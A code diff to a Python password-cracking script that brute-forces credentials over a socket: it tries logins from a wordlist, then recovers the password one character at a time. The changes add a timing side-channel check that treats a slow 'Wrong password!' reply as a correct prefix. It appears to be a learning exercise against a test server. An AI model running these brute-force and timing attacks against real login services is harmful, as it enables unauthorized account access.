@@ -2,6 +2,7 @@ import sys
 import socket
 import itertools
 import json
+from datetime import datetime
 
 
 def brute_force():
@@ -9,9 +10,7 @@ def brute_force():
 
     password_length = 1
     while True:
-        for possible_password in itertools.product(all_signs, repeat=password_length):
-            possible_password = ''.join(possible_password)
-
+        for possible_password in map(''.join, itertools.product(all_signs, repeat=password_length)):
             client_socket.send(possible_password.encode())
             response = client_socket.recv(1024).decode()
 
@@ -52,6 +51,7 @@ def find_login():
         for possible_login in logins:
             possible_login = possible_login.rstrip('\n')
             login_password = {"login": possible_login, "password": ""}
+
             client_socket.send(json.dumps(login_password).encode())
 
             response = client_socket.recv(1024).decode()
@@ -70,14 +70,20 @@ def find_password():
         for sign in all_signs:
             possible_password = password_ + sign
             login_password = {"login": login, "password": possible_password}
+
+            first = datetime.now()
+
             client_socket.send(json.dumps(login_password).encode())
 
             response = client_socket.recv(1024).decode()
             response = json.loads(response)
 
+            second = datetime.now()
+            difference = (second - first).total_seconds()
+
             if response["result"] == "Connection success!":
                 return possible_password
-            if response["result"] == "Exception happened during login":
+            if response["result"] == "Wrong password!" and difference >= 0.1:
                 password_ = possible_password
                 break
 
